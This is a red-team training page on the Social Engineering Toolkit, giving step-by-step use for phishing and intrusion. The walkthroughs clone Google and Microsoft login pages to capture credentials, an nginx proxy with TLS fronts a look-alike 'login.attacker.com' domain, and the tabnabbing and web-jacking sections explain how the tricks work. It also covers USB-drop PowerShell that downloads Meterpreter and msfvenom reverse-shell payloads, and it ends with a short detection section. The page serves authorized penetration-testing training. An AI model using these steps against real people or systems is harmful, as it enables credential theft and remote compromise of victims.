---
layout: training-page
title: "Social Engineering Toolkit (SET) — Red Team Academy"
module: "Social Engineering"
tags:
  - set
  - social-engineering
  - credential-harvesting
  - phishing
  - tools
page_key: "se-set"
render_with_liquid: false
---

# Social Engineering Toolkit (SET)

The Social Engineering Toolkit (SET) is an open-source Python framework developed by Dave Kennedy at TrustedSec. It automates many social engineering attack vectors — credential harvesting, spear phishing, payload delivery, and HID attacks — making it accessible for red teamers and penetration testers.

## Overview

```
Author:     Dave Kennedy (@HackingDave) / TrustedSec
Language:   Python 3
Platform:   Linux (Kali, Parrot, Ubuntu)
Purpose:    Automate common SE attack vectors for authorized assessments
License:    GPLv3 / Apache 2.0

Primary capabilities:
  - Clone and host credential harvesting pages
  - Spear phishing email campaigns with payloads
  - Automated payload generation (integrates with Metasploit)
  - HID/Teensy keyboard injection attack generation
  - Mass mailer / targeted email attacks
  - SMS spoofing (via third-party API integration)
```

## Installation

```bash
# Method 1: Package manager (pre-installed on Kali Linux)
sudo apt update && sudo apt install set

# Method 2: Git clone (always latest version — recommended)
git clone https://github.com/trustedsec/social-engineer-toolkit /opt/setoolkit
cd /opt/setoolkit

# Install dependencies
pip3 install -r requirements.txt

# Install SET
sudo python3 setup.py install

# Or run directly without installing:
cd /opt/setoolkit
sudo python3 setoolkit

# Launch
sudo setoolkit
# Note: requires root for binding to port 80/443
```

---

## Main Menu Structure

```
Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit

set>
```

---

## Key Modules

### Spear-Phishing Attack Vector

```
Menu path: 1 → 1 (Spear-Phishing Attack Vectors)

Available options:
  1) Perform a Mass Email Attack
  2) Create a FileFormat Payload
  3) Create a Social-Engineering Template

Sub-options under Mass Email Attack:
  1) E-Mail Attack Single Email Address
  2) E-Mail Attack Mass Mailer
```

#### Single Email Attack

```
set:phishing> 1   (E-Mail Attack Single Email Address)

SET will ask:
  - Which file format to use (PDF, Word, Excel, PowerShell, etc.)
  - Your sending email address and SMTP credentials
  - The target's email address
  - Subject line and email body

SET generates the payload, attaches it to the email,
and sends via your specified SMTP server.

SMTP configuration:
  - Use your own Postfix server (see phishing-tradecraft.md)
  - Or enter Gmail/SMTP credentials (less reliable; may be blocked)
  - SET stores SMTP settings in /etc/setoolkit/set.config
```

#### Mass Mailer

```
set:phishing> 2   (E-Mail Attack Mass Mailer)

Target file format: one email address per line
  j.smith@contoso.com
  j.doe@contoso.com
  a.jones@contoso.com

SET sends the same email with the same payload to all targets.
No per-target tracking (use GoPhish for tracked campaigns).

Use case: broad internal phishing simulation where metrics
are collected server-side (who connects to SET's HTTP server)
```

#### File Format Payloads

```
Available payload formats (selected examples):
  1)  SET Custom Written DLL Hijacking Attack
  2)  SET Custom Written Document UNC LM SMB Capture Attack
  3)  Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow
  4)  Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)
  5)  Adobe Flash Player "Button" Remote Code Execution
  6)  Adobe CoolType SING Table "uniqueName" Overflow
  7)  Adobe Flash Player "newfunction" Invalid Pointer Use
  ...
  13) PowerShell Alphanumeric Shellcode Injector
  14) Macro Enabled Microsoft Word 97-2003
  17) Macro Enabled Microsoft Excel
  ...

Modern context (2026):
  Most file format exploits target old, patched vulnerabilities.
  Unpatched targets: occasionally found in OT/ICS environments.
  Macro-based payloads: blocked by default in Office 365.
  Recommended modern use: PowerShell-based payloads, HTML smuggling.
  SET's value: the delivery mechanism and social engineering wrapper,
  not necessarily the payload format.
```

---

## Website Attack Vectors

```
Menu path: 1 → 2 (Website Attack Vectors)

   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method
   4) Tabnabbing Attack Method
   5) Web Jacking Attack Method
   6) Multi-Attack Web Method
   7) HTA Attack Method

Modern relevance:
  Option 3 (Credential Harvester) — HIGH VALUE, works in 2026
  Option 4 (Tabnabbing)           — MODERATE VALUE, works but limited
  Option 5 (Web Jacking)          — MODERATE VALUE, works but detected
  Options 1, 2                    — LOW VALUE, browser exploits largely patched
  Option 7 (HTA)                  — MODERATE, HTA execution increasingly blocked
```

### Credential Harvester Attack Method

The most consistently useful SET module — clones a login page and captures submitted credentials.

```
Menu path: 1 → 2 → 3

   1) Web Templates
   2) Site Cloner
   3) Custom Import

Option 1 — Web Templates (pre-built):
  1) Java Required
  2) Google
  3) Twitter
  4) Facebook
  5) Yahoo

Option 2 — Site Cloner (recommended — works on any site):
  SET will prompt: "Enter the IP address for POST back [press enter for IP]:"
  Enter your server's external IP: 1.2.3.4

  "Enter the url to clone:"
  Enter: https://login.microsoftonline.com

Option 3 — Custom Import:
  Provide path to your own HTML file
  Useful for branded internal login pages you've manually crafted
```

---

## Credential Harvester: Step-by-Step Walkthrough

```
Step 1: Launch SET
sudo setoolkit

Step 2: Navigate to Credential Harvester
set> 1  (Social-Engineering Attacks)
set:SE> 2  (Website Attack Vectors)
set:Website> 3  (Credential Harvester Attack Method)
set:Harvester> 2  (Site Cloner)

Step 3: Enter your listener IP
set:Harvester:clone> Enter the IP address for POST back: 203.0.113.10
(use your VPS external IP — this is where credentials POST to)

Step 4: Enter the target URL to clone
set:Harvester:clone> Enter the URL to clone: https://accounts.google.com/signin

SET will:
  1. Download the HTML, CSS, and JavaScript from the target page
  2. Modify form action to POST to http://203.0.113.10/post
  3. Start a Python HTTP server on port 80 (or 443 if configured)

Step 5: Deliver the link to targets
  https://203.0.113.10   (if using IP — less convincing)
  Or: configure a domain and proxy to SET's HTTP server via nginx

Step 6: Monitor for credentials in SET terminal
  SET displays harvested data as it arrives:
  [*] WE GOT A HIT! Printing the output:
  POSSIBLE USERNAME FIELD FOUND: Email=victim@gmail.com
  POSSIBLE PASSWORD FIELD FOUND: Passwd=SecurePassword123
  [*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.

Step 7: Credentials also saved to file
  /root/.set/reports/  — contains harvested credentials and HTML report
  cat /root/.set/reports/2026-04-13_harvest.txt

Step 8: After credential capture, stop SET (Ctrl+C)
  SET generates a report in /root/.set/reports/
```

### What Captured Output Looks Like

```
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: login=john.smith@contoso.com
POSSIBLE PASSWORD FIELD FOUND: passwd=Contoso2026!
POSSIBLE USERNAME FIELD FOUND: login=jane.doe@contoso.com
POSSIBLE PASSWORD FIELD FOUND: passwd=Summer2026#

[*] Credential Harvest capture complete! File stored in the report folder.

Report file example contents:
  Date/Time: 2026-04-13 14:32:17
  IP: 203.0.113.55
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
  POST Data: login=john.smith%40contoso.com&passwd=Contoso2026%21
```

### Serving SET Behind nginx (For Domain Use)

```bash
# Set SET to listen on a local port (edit /etc/setoolkit/set.config)
# WEB_PORT=8080   (SET listens on localhost:8080)

# nginx reverse proxy to make SET accessible on port 80/443 with a domain:
cat > /etc/nginx/sites-available/phishing.conf << 'EOF'
server {
    listen 80;
    server_name login.attacker.com;
    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
EOF

sudo ln -s /etc/nginx/sites-available/phishing.conf /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx

# Add TLS with Let's Encrypt:
sudo certbot --nginx -d login.attacker.com
```

---

## Tabnabbing Attack

```
Menu path: 1 → 2 → 4

How tabnabbing works:
  1. Attacker sends a link to a benign-looking page
  2. Target opens it, then switches to another browser tab
  3. JavaScript on the page detects when the tab loses focus
  4. Page silently replaces itself with a cloned login page
     (e.g., "Your Office 365 session has expired — please log in again")
  5. Target returns to the tab, sees the login page, enters credentials

SET automates: the JavaScript injection and credential capture.
Delivery: send the benign link via email or chat.
Limitation: modern browsers show the original URL in the tab;
            target may notice URL doesn't match the login page shown.
Best use: internal engagement where targets are less scrutinous,
          or combined with a look-alike domain.
```

---

## Web Jacking Attack Method

```
Menu path: 1 → 2 → 5

How web jacking works:
  1. SET sends an email with a real-looking link (to the real site)
  2. When clicked, the browser briefly shows the real site
  3. After a short delay (configurable), JavaScript replaces the
     page with the SET credential harvester clone
  4. Target may not notice the switch if they're not paying close attention

SET automates: the redirect timing and page swap.
Delivery: typically via email with the link to the jacking page.
Limitation: visible URL change in the browser address bar;
            less effective on security-aware targets.
```

---

## HID / Teensy Attack Vectors

```
Menu path: 1 → 6 (Arduino-Based Attack Vector) OR
           1 → 12 (QRCode Generator Attack Vector) — varies by SET version

Supported platforms:
  - Teensy USB (teensy-usb.com) — microcontroller HID device
  - USB Rubber Ducky (Hak5) — emulates keyboard at USB level
  - Arduino Leonardo / Micro with HID library

Payload: SET generates keystroke injection code that:
  1. Opens Run dialog (Win+R) or Terminal
  2. Types a PowerShell command
  3. Executes a reverse shell or payload download
  4. All happens in 2–5 seconds before the user can intervene

SET PowerShell reverse shell payload example (generated by SET):
  powershell -nop -w hidden -e <base64-encoded-command>

The base64 command downloads and executes a Meterpreter payload.

Usage scenario:
  - Drop USB device in target facility
  - Plug into test machine during physical engagement
  - Victim plugs in "found" USB → payload executes automatically
```

---

## Create a Payload and Listener

```
Menu path: 1 → 4 (Create a Payload and Listener)

SET wraps Metasploit's msfvenom for payload generation:

Available payloads:
  1) Windows Shell Reverse_TCP               — simple cmd shell
  2) Windows Reverse_TCP Meterpreter         — full Meterpreter session
  3) Windows Reverse TCP VNC DLL             — VNC access
  4) Windows Bind Shell                      — bind (target opens port)
  5) Windows Reverse_TCP Shell (x64)         — 64-bit shell
  6) Windows Meterpreter Reverse_TCP (X64)   — 64-bit Meterpreter
  7) Windows Meterpreter Egress Buster       — tries multiple ports
  8) Linux Reverse_TCP Shell                 — Linux/macOS target
  ...

SET will:
  1. Generate the payload executable using msfvenom
  2. Start a Metasploit listener (multi/handler) automatically
  3. Wait for the payload to call back

Files generated in: /root/.set/payload.exe (or .elf for Linux)
Deliver via: email attachment, USB drop, hosted download link
```

---

## Integrating SET with GoPhish

Using GoPhish for email delivery with SET as the credential harvesting backend combines GoPhish's per-target tracking with SET's automated site cloning.

### Architecture

```
[GoPhish] ──sends email──► [Target]
                                │
                        clicks tracking link
                                │
                        [GoPhish redirects]
                                │
                     ──► [SET Credential Harvester]
                                │
                        target enters credentials
                                │
                     ──► [SET captures and logs]
                                │
                     ──► [Redirect to real site]
```

### Workflow

```bash
# Step 1: Start SET Credential Harvester on your VPS
sudo setoolkit
# Navigate: 1 → 2 → 3 → 2 (Site Cloner)
# IP: <your VPS IP>
# URL: https://login.microsoftonline.com
# SET starts on port 80

# Step 2: (Optional) Put SET behind nginx with your phishing domain
# See nginx configuration above

# Step 3: In GoPhish, configure the Landing Page
# GoPhish Admin → Landing Pages → New Page
# Name: "O365 Harvester"
# Instead of importing the site:
#   Set the "Redirect To" field to your SET URL:
#   https://login.attacker.com/
# OR: Use GoPhish's own credential capture + redirect to SET
#   for dual-capture (both GoPhish and SET record the credentials)

# Step 4: Configure GoPhish email template with {{.URL}}
# The {{.URL}} resolves to GoPhish's per-target tracking URL
# GoPhish records the click → then redirects to SET harvester

# Step 5: Campaign results in GoPhish show:
#   - Who received the email
#   - Who opened it (tracking pixel)
#   - Who clicked the link (GoPhish redirect log)
# SET shows:
#   - Actual credentials submitted

# Correlate GoPhish click timestamps with SET capture timestamps
# to match credentials to specific targets
```

---

## Detection Context

### SET Server Signals

```
Network indicators:
  - Python HTTP server running on port 80 (default)
  - Process: python3 ... SimpleHTTPServer or http.server
  - Visible with: netstat -tlnp | grep :80
                  ss -tlnp | grep :80
  - Inbound POST requests to /post endpoint
  - Server header: "SimpleHTTP/0.6 Python/3.x.x" (if not behind nginx)

File system indicators:
  - /root/.set/ directory — contains reports, captured credentials, config
  - /root/.set/reports/2026-*.txt — harvested credentials in plaintext
  - /tmp/SET_SERVER — lock file indicating SET is running
  - /tmp/meta.py — Metasploit integration temp files

Process indicators:
  ps aux | grep setoolkit
  ps aux | grep "http.server"
```

### EDR / Proxy Signals When Target Connects

```
Proxy / URL filtering:
  - New domain (< 30 days registered): suspicious category
  - Suspicious domain name pattern (typosquatting flagged by some proxies)
  - Certificate mismatch if real domain vs clone domain
  - SSL inspection: proxy may see POST with credential-like data

Endpoint (if proxy SSL inspection is deployed):
  - Credential submission to non-corporate domain
  - Form POST to unusual destination
  - Rapid redirect chain (benign URL → SET URL)

High-confidence signals:
  - Credentials submitted to a domain not matching the expected SSO domain
  - Browser password manager warning: "This is not the real Microsoft login"
  - HSTS preloading: browser may reject the clone if the real domain is HSTS-pinned
```

---

## Resources

- SET GitHub — `github.com/trustedsec/social-engineer-toolkit`
- TrustedSec — `trustedsec.com`
- Dave Kennedy (@HackingDave) — SET author
- MITRE T1566 — Phishing — `attack.mitre.org/techniques/T1566/`
- MITRE T1598 — Phishing for Information — `attack.mitre.org/techniques/T1598/`
- Metasploit Framework — `github.com/rapid7/metasploit-framework`
- GoPhish — open source phishing framework — `github.com/gophish/gophish`
- "The Social Engineer's Playbook" — Jeremiah Talamantes
